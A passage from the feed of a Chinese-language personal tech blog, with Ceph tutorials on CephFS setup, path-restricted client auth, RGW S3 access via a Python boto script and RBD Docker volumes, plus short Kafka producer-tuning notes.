&lt;li&gt;cephfs.cephfs-data.meta
&lt;ul&gt;
&lt;li&gt;給 mds service 使用的 metadata&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241210123239.png&quot; alt=&quot;Pasted image 20241210123239.png&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;部署 mds 服務&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ceph orch apply mds cephfs-data
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226000609.png&quot; alt=&quot;Pasted image 20251226000609.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;MDS 的服務已經分別部署在 ceph-cluster-01 與 ceph-cluster-02&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241210123533.png&quot; alt=&quot;Pasted image 20241210123533.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;之後再根據這篇完成掛載即可&lt;br /&gt;
&lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/ceph/Ceph%20cluster%20%E8%B3%87%E6%96%99%E5%AF%AB%E5%85%A5%E7%AF%87%20-%20CephFS/&quot;&gt;Ceph cluster 資料寫入篇 - CephFS&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ceph/cephadm/ceph 建立 filesystem/" >
        </entry>
        <entry>
            <title>
                Cephfs ACL mount path
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ceph/Cephfs ACL mount path/</id>
            <content type="html">
                &lt;h1 id=&quot;背景&quot; tabindex=&quot;-1&quot;&gt;背景&lt;/h1&gt;
&lt;p&gt;現在已經可以 mount 到指定的資料夾，但還是有機會被 mount 到 &amp;quot;/&amp;quot;&lt;br /&gt;
期望可以依照 user keyring 來指定能掛載的 path&lt;br /&gt;
官方文件&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://hung-jia-jun.github.io/#fn1&quot; id=&quot;fnref1&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt; 已經有實現這部分的 ACL 控制了&lt;/p&gt;
&lt;h1 id=&quot;思路&quot; tabindex=&quot;-1&quot;&gt;思路&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;建立用戶並設定 Auth 規則，只能掛載特定的 Path&lt;/li&gt;
&lt;li&gt;copy client keyring 到 client 機器&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;demo&quot; tabindex=&quot;-1&quot;&gt;Demo&lt;/h1&gt;
&lt;h2 id=&quot;ceph-cluster-master&quot; tabindex=&quot;-1&quot;&gt;Ceph-cluster master&lt;/h2&gt;
&lt;p&gt;輸出所有的 ceph filesystem name&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@ceph-cluster-01:/mnt/ceph-cluster# ceph fs ls
name: cephfs-data, metadata pool: cephfs.cephfs-data.meta, data pools: [cephfs.cephfs-data.data ]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立 「api_user」，並指定該用戶能掛載目錄位置&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;root@ceph-cluster-01:/etc/ceph# ceph fs authorize cephfs-data client.api_user /lab/latest rw
[client.api_user]
	key = YOUR_KEY==
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立的 client 會指名只能掛載指定的 path&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ceph-cluster-01:/etc/ceph# ceph auth get client.api_user
exported keyring for client.api_user
[client.api_user]
	key = YOUR_KEY==
	caps mds = &amp;quot;allow rw path=/test/api/lab/latest&amp;quot;
	caps mon = &amp;quot;allow r&amp;quot;
	caps osd = &amp;quot;allow rw tag cephfs data=cephfs-data&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;client-server&quot; tabindex=&quot;-1&quot;&gt;client server&lt;/h2&gt;
&lt;p&gt;將 server 端產製的 auth key 放到 ceph config目錄&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@lab-api:/etc/ceph# cat &amp;lt;&amp;lt; EOF &amp;gt; ceph.client.api_user.keyring
&amp;gt; [client.api_user]
&amp;gt;     key = YOUR_KEY==
&amp;gt; EOF

root@lab-api:/etc/ceph# cat ceph.client.api_user.keyring 
[client.api_user]
    key = YOUR_KEY==
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;嘗試 mount 一個不允許的資料夾位置 &lt;code&gt;/test/api/lab&lt;/code&gt;&lt;br /&gt;
出現 「Operation not permitted」&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@test:/etc/ceph# ceph-fuse -n client.api_user  -r /test/api/lab /mnt/fuse_cephfs2
ceph-fuse[566845]: starting ceph client
ceph-fuse[5668452024-12-17T17:36:51.358+0800 7f18a4ff9700 -1 client.35409 mds.0 rejected us (non-allowable root &#39;/test/api/lab&#39;)
]: ceph mount failed with (1) Operation not permitted
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果 mount 到合法的位置，就掛載成功&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@lab-api:/etc/ceph# ceph-fuse -n client.api_user  -r /test/api/lab/latest /mnt/fuse_cephfs2
ceph-fuse[567096]: starting ceph client
2024-12-17T17:38:16.602+0800 7fd850d0a080 -1 init, newargv = 0x5636070a9900 newargc=9
ceph-fuse[567096]: starting fuse
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同樣的，也可以使用 linux 系統的 Mount 指令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@lab-api:/etc/ceph# cat /etc/hosts
10.94.1.20 ceph-cluster-01
10.94.1.21 ceph-cluster-02
10.94.1.22 ceph-cluster-03
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ mount -t ceph ceph-cluster-01,ceph-cluster-02,ceph-cluster-03:/test/api/lab/latest /mnt/fuse_cephfs2 -o name=api_user
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;清理環境&quot; tabindex=&quot;-1&quot;&gt;清理環境&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ sudo umount -lf /mnt/fuse_cephfs2/
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;reference&quot; tabindex=&quot;-1&quot;&gt;Reference&lt;/h1&gt;
&lt;hr class=&quot;footnotes-sep&quot; /&gt;
&lt;section class=&quot;footnotes&quot;&gt;
&lt;ol class=&quot;footnotes-list&quot;&gt;
&lt;li id=&quot;fn1&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;&lt;a href=&quot;https://docs.ceph.com/en/reef/cephfs/client-auth/#path-restriction&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://docs.ceph.com/en/reef/cephfs/client-auth/#path-restriction&lt;/a&gt; &lt;a href=&quot;https://hung-jia-jun.github.io/#fnref1&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ceph/Cephfs ACL mount path/" >
        </entry>
        <entry>
            <title>
                Ceph cluster 資料寫入篇 - ceph S3
                
            </title>
            <updated>2025-12-25T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ceph/Ceph cluster 資料寫入篇 - ceph S3/</id>
            <content type="html">
                &lt;h2 id=&quot;前言&quot; tabindex=&quot;-1&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;續前篇 &lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/ceph/%E6%90%AD%E5%BB%BA%20Ceph%20cluster/&quot;&gt;搭建 Ceph cluster&lt;/a&gt; 結果，已經有一個 ceph cluster 可以使用了，現在要做的是將資料存入 ceph S3 內。&lt;/p&gt;
&lt;p&gt;這邊會選用 Ceph S3 做範例的原因是因為 Ceph S3 和 AWS S3 都是基於 S3 API 標準進行物件儲存，兩者程式碼間可以無痛轉移。&lt;/p&gt;
&lt;h2 id=&quot;差異&quot; tabindex=&quot;-1&quot;&gt;差異&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;AWS S3 (Simple Storage Service)&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;完全由 AWS 管理的公有雲服務，使用者無需關注基礎設施的運維。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ceph S3&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;開源的分散式儲存系統，可部署在私有雲、公有雲或混合雲中。&lt;/li&gt;
&lt;li&gt;Ceph 提供了與 S3 API 兼容的物件儲存介面，通過 &lt;strong&gt;RADOS Gateway (RGW)&lt;/strong&gt; 實現。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;相同&quot; tabindex=&quot;-1&quot;&gt;相同&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 使用 S3 API&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;相同點&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;都支持 &lt;strong&gt;AWS S3 API 標準&lt;/strong&gt;，如 &lt;strong&gt;PUT、GET、DELETE&lt;/strong&gt; 請求操作。&lt;/li&gt;
&lt;li&gt;客戶端可以使用相同的 S3 工具（如 &lt;code&gt;boto3&lt;/code&gt;）與 Ceph S3 和 AWS S3 通訊。&lt;/li&gt;
&lt;li&gt;支援 RESTful API 進行物件存取和操作。&lt;br /&gt;
&lt;strong&gt;2. 存儲模型&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;相同點&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;都基於 &lt;strong&gt;桶（Bucket）&lt;/strong&gt; 和 &lt;strong&gt;物件（Object）&lt;/strong&gt; 的存儲結構設計。&lt;/li&gt;
&lt;li&gt;支援桶內物件的層級目錄結構（邏輯上的文件夾）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;demo&quot; tabindex=&quot;-1&quot;&gt;Demo&lt;/h2&gt;
&lt;h3 id=&quot;rgw&quot; tabindex=&quot;-1&quot;&gt;搭建 rgw 節點&lt;/h3&gt;
&lt;p&gt;建立 rgw 節點 token&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker exec ceph-mon ceph auth get client.bootstrap-rgw -o /var/lib/ceph/bootstrap-rgw/ceph.keyring
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;啟動 rgw 節點&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run -d --privileged=true --name ceph-rgw --network ceph-network --ip 172.20.0.15 -e CLUSTER=ceph -e RGW_NAME=ceph-rgw -p 7480:7480 -v /var/lib/ceph/:/var/lib/ceph/ -v /etc/ceph:/etc/ceph -v /etc/localtime:/etc/localtime:ro ceph/daemon:latest-luminous rgw
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;建立使用者&quot; tabindex=&quot;-1&quot;&gt;建立使用者&lt;/h3&gt;
&lt;p&gt;連線到 ceph-rgw 主機建立 testuser&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker exec ceph-rgw radosgw-admin user create --uid=&amp;quot;testuser&amp;quot; --display-name=&amp;quot;testuser&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看剛剛建立的 testuser&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker exec ceph-rgw radosgw-admin   user info --uid testuser
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241126234037.png&quot; alt=&quot;Pasted image 20241126234037.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;填入剛剛顯示的 access_key 與 secret_key 欄位的值到 python script&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import os
import boto
import boto.s3.connection

# S3 連線憑證
access_key = &#39;ACCESS_KEY&#39;
secret_key = &#39;SECRET_KEY&#39;

# 連接到 S3 儲存服務
conn = boto.connect_s3(
	aws_access_key_id=access_key,
	aws_secret_access_key=secret_key,
	host=&#39;172.20.0.15&#39;,  # 替換為自建的 ceph RGW 節點 IP
	port=7480,  # 替換為自建的 ceph RGW 節點 Port
	is_secure=False,  # 禁用 HTTPS
	calling_format=boto.s3.connection.OrdinaryCallingFormat(),
)

# 儲存桶內物件的操作
def manage_bucket_operations():
	bucket_name = &amp;quot;my-new-bucket-1&amp;quot;
	local_download_dir = &amp;quot;./downloaded_files&amp;quot;  # 本機下載目錄

	print(&amp;quot;建立儲存桶...&amp;quot;)
	bucket = conn.create_bucket(bucket_name)

	# 上傳檔案到儲存桶
	file_path = &amp;quot;example.txt&amp;quot;
	print(&amp;quot;上傳檔案...&amp;quot;)
	key = bucket.new_key(&amp;quot;example.txt&amp;quot;)
	key.set_contents_from_filename(file_path)
	print(&amp;quot;檔案已上傳: example.txt&amp;quot;)

	# 顯示儲存桶內所有檔案
	print(&amp;quot;顯示儲存桶內所有檔案...&amp;quot;)
	for key in bucket.list():
		print(f&amp;quot;檔案名稱: {key.name}&amp;quot;)

	# 下載儲存桶內容到本機
	print(&amp;quot;下載儲存桶內容到本機...&amp;quot;)
	if not os.path.exists(local_download_dir):
		os.makedirs(local_download_dir)
	for key in bucket.list():
		local_file_path = os.path.join(local_download_dir, key.name)
		print(f&amp;quot;下載檔案: {key.name} 到 {local_file_path}&amp;quot;)
		key.get_contents_to_filename(local_file_path)
	print(f&amp;quot;儲存桶內容已下載到: {local_download_dir}&amp;quot;)

	# 清空儲存桶內所有物件
	print(&amp;quot;清空儲存桶內的所有物件...&amp;quot;)
	for key in bucket.list():
		print(f&amp;quot;刪除物件: {key.name}&amp;quot;)
		bucket.delete_key(key.name)
	print(&amp;quot;儲存桶已清空&amp;quot;)

	# 刪除儲存桶
	print(&amp;quot;刪除儲存桶...&amp;quot;)
	conn.delete_bucket(bucket_name)
	print(f&amp;quot;已刪除儲存桶：{bucket_name}&amp;quot;)

# 執行範例
if __name__ == &amp;quot;__main__&amp;quot;:
	print(&amp;quot;執行儲存桶操作...&amp;quot;)
	manage_bucket_operations()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;result&quot; tabindex=&quot;-1&quot;&gt;Result&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241127001610.png&quot; alt=&quot;Pasted image 20241127001610.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Ref: &lt;a href=&quot;https://docs.ceph.com/en/reef/radosgw/s3/python/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://docs.ceph.com/en/reef/radosgw/s3/python/&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ceph/Ceph cluster 資料寫入篇 - ceph S3/" >
        </entry>
        <entry>
            <title>
                Ceph cluster 資料寫入篇 - RBD
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ceph/Ceph cluster 資料寫入篇 - RBD/</id>
            <content type="html">
                &lt;p&gt;進入 ceph-mon&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker exec -it ceph-mon bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立 osd pool&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;osd pool create test-rbd 128 128
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;顯示所有 pool&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ceph osd pool ls
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;ceph osd pool application enable test-rbd rbd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在已建立的 osd pool 內，建立一個 test-data-image&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rbd create test-data-image --size 20G --pool test-rbd --image-format 2 --image-feature layering
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;rbd create --pool test-rbd --image rbd-demo1.img --size 10G
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;rbd ls --pool test-rbd
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;rbd --image test-data-image --pool test-rbd info
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$ ceph auth get-or-create client.testuser mon &#39;allow r&#39; osd &#39;allow * pool=test-rbd&#39; -o /var/lib/ceph/client-auth/ceph.keyring
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;回到宿主機上&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir -p /var/lib/ceph/client-auth/
cp /var/lib/ceph/client-auth/ceph.keyring /etc/ceph/client-auth/ceph.keyring
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安裝 docker rbd plugin (每個 node 都要)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker plugin install wetopi/rbd &#92;
  --alias=wetopi/rbd &#92;
  LOG_LEVEL=1 &#92;
  RBD_CONF_POOL=&amp;quot;test-rbd&amp;quot; &#92;
  RBD_CONF_CLUSTER=ceph &#92;
  RBD_CONF_KEYRING_USER=client.testuser
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;docker plugin ls
ID             NAME                DESCRIPTION             ENABLED
029dbbd2e032   wetopi/rbd:latest   RBD plugin for Docker   true
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;docker volume create -d wetopi/rbd my_rbd_volume
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/wetopi/docker-volume-rbd&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://github.com/wetopi/docker-volume-rbd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://rdwaykos.medium.com/ceph-rbd-for-docker-volume-fa2884cedaf5&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://rdwaykos.medium.com/ceph-rbd-for-docker-volume-fa2884cedaf5&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;測試掛載剛剛建立的 volume&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run -it --rm &#92;
  --volume my_rbd_volume:/data:ro &#92;
  --network ceph-network &#92;
  --volume-driver=wetopi/rbd &#92;
  ubuntu:latest bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;連線到 ceph mon 可以看到剛剛建立的 volume 已經被 ceph 託管了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ rbd ls test-rbd
my_rbd_volume
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;將建立好的 ceph.keyring 同步到其他台主機的 /etc/ceph&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo scp -i /home/ubuntu/.ssh/id_rsa -r /etc/ceph ubuntu@192.168.1.51:~/ceph
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$ sudo mv ./ceph.keyring /etc/ceph
$ ls /etc/ceph
ceph.keyring
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;重要事項&quot; tabindex=&quot;-1&quot;&gt;重要事項&lt;/h2&gt;
&lt;p&gt;RBD 不支援一個 volume 被多個 container 掛載(readwrite many)，只有 ReadWriteOnce 模式&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ceph/Ceph cluster 資料寫入篇 - RBD/" >
        </entry>
        <entry>
            <title>
                Ceph cluster 資料寫入篇 - CephFS
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ceph/Ceph cluster 資料寫入篇 - CephFS/</id>
            <content type="html">
                &lt;h2 id=&quot;環境準備&quot; tabindex=&quot;-1&quot;&gt;環境準備&lt;/h2&gt;
&lt;h2 id=&quot;在準備掛載的主機&quot; tabindex=&quot;-1&quot;&gt;在準備掛載的主機&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;安裝 ceph-fuse&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt install ceph-fuse
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;ceph&quot; tabindex=&quot;-1&quot;&gt;在 ceph 主機&lt;/h3&gt;
&lt;hr /&gt;
&lt;pre&gt;&lt;code&gt;ssh ubuntu@ceho-mon &amp;lt;--- cephFS 主機
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安裝 ceph-fuse&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt install ceph-fuse
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立使用者&lt;br /&gt;
設定client.mds_user 為使用者名稱，後面則是分別設定mon,mds,osd的存取權限&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ceph auth get-or-create client.mds_user mon &#39;allow r&#39; mds &#39;allow *&#39; osd &#39;allow rw pool=cephfs_metadata,allow rwx pool=cephfs_data&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看使用者及其存取權限&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;ceph auth list
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同步主機憑證&lt;br /&gt;
&lt;a href=&quot;mailto:ubuntu@192.168.1.62&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;ubuntu@192.168.1.62&lt;/a&gt; 為待會要掛載 NFS 資料夾的主機位置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo scp -i ~/.ssh/id_rsa -r /etc/ceph ubuntu@192.168.1.62:/etc/ceph
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;在準備掛載的主機-1&quot; tabindex=&quot;-1&quot;&gt;在準備掛載的主機&lt;/h2&gt;
&lt;hr /&gt;
&lt;pre&gt;&lt;code&gt;ssh ubuntu@192.168.1.62 &amp;lt;--- 欲掛載的主機
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立掛載資料夾&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir -p /mnt/fuse_cephfs
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;掛載 cephfs 到 /mnt/fuse_cephfs&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 指定 172.20.0.10 為 ceph-mon 的 IP 位置
sudo ceph-fuse -m 172.20.0.10:6789 /mnt/fuse_cephfs

# 如果 /etc/ceph/ceph.confg 設定檔有設定 mon_ip 就不用帶『-m 172.20.0.10:6789』 參數
sudo ceph-fuse /mnt/fuse_cephfs

# Debug mode
sudo ceph-fuse /mnt/fuse_cephfs -d

# 指定 mount cephfs 的位置
ceph-fuse -r /lab/api /mnt/fuse_cephfs
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241127141833.png&quot; alt=&quot;Pasted image 20241127141833.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;嘗試讀取同一個檔案內容&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251225235515.png&quot; alt=&quot;Pasted image 20251225235515.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;修改檔案後，也同步到另一台機器了&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251225235413.png&quot; alt=&quot;Pasted image 20251225235413.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;mount-cephfs&quot; tabindex=&quot;-1&quot;&gt;指定 mount cephfs 的位置&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;ceph-fuse -r /lab/api /mnt/fuse_cephfs
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a class=&quot;internal-link is-unresolved&quot; href=&quot;https://hung-jia-jun.github.io/404&quot; target=&quot;&quot;&gt;cephfs 指定 mount cephfs 的位置&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;清理環境&quot; tabindex=&quot;-1&quot;&gt;清理環境&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;$ df -h
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251225235639.png&quot; alt=&quot;Pasted image 20251225235639.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;清除正在這個 mount 資料夾的user&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ fuser -km /mnt/fuse_cephfs/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251225235620.png&quot; alt=&quot;Pasted image 20251225235620.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;umount&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo umount -lf /mnt/fuse_cephfs/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251225235707.png&quot; alt=&quot;Pasted image 20251225235707.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ceph/Ceph cluster 資料寫入篇 - CephFS/" >
        </entry>
        <entry>
            <title>
                kafka 高效率傳輸設定
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka 高效率傳輸設定/</id>
            <content type="html">
                &lt;p&gt;訂閱 kafka 消息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-consumer --bootstrap-server 127.0.0.1:19092 --topic wikimedia.recentchange
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;高效率傳輸時，可考慮以下設定&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;max.in.flight.requests.per.connection
&lt;ol&gt;
&lt;li&gt;每個 producer 在 broker 回覆 ack 前，最多送幾筆訊息出去&lt;/li&gt;
&lt;li&gt;若設定 = 1
&lt;ol&gt;
&lt;li&gt;訊息只會一筆一筆發，會降低效率，但好處是，若訊息需要嚴格的排序(有新增 sort key)，那很重要&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;等待一段 &lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt;，在此期間收到的消息都放在自己的暫存區，若 broker 批處理(batch.size)在 &lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt; 到達之前填滿，則立即批處理暫存區內的訊息，否則達到 &lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt; 才進行批處理&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;compression.type
&lt;ol&gt;
&lt;li&gt;批處理參數，用於 broker 端壓縮訊息使用的算法(e.g. lz4、zstd、gzip...etc)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;batch.size
&lt;ol&gt;
&lt;li&gt;批處理的單筆 message 大小，若超過，則立即處理該訊息&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka 高效率傳輸設定/" >
        </entry>
        <entry>
            <title>
                kafka  topic 實驗
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka  topic 實驗/</id>
            <content type="html">
                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#kafka&quot;&gt;#kafka&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;環境設定&quot; tabindex=&quot;-1&quot;&gt;環境設定&lt;/h2&gt;
&lt;p&gt;docker-compose.yaml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;version: &#39;2.1&#39;
services:
  zoo1:
    image: confluentinc/cp-zookeeper:7.3.2
    hostname: zoo1
    container_name: zoo1
    ports:
      - &amp;quot;2181:2181&amp;quot;
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181
      ZOOKEEPER_SERVER_ID: 1
      ZOOKEEPER_SERVERS: zoo1:2888:3888

  kafka1:
    image: confluentinc/cp-kafka:7.3.2
    hostname: kafka1
    container_name: kafka1
    ports:
      - &amp;quot;9092:9092&amp;quot;
      - &amp;quot;29092:29092&amp;quot;
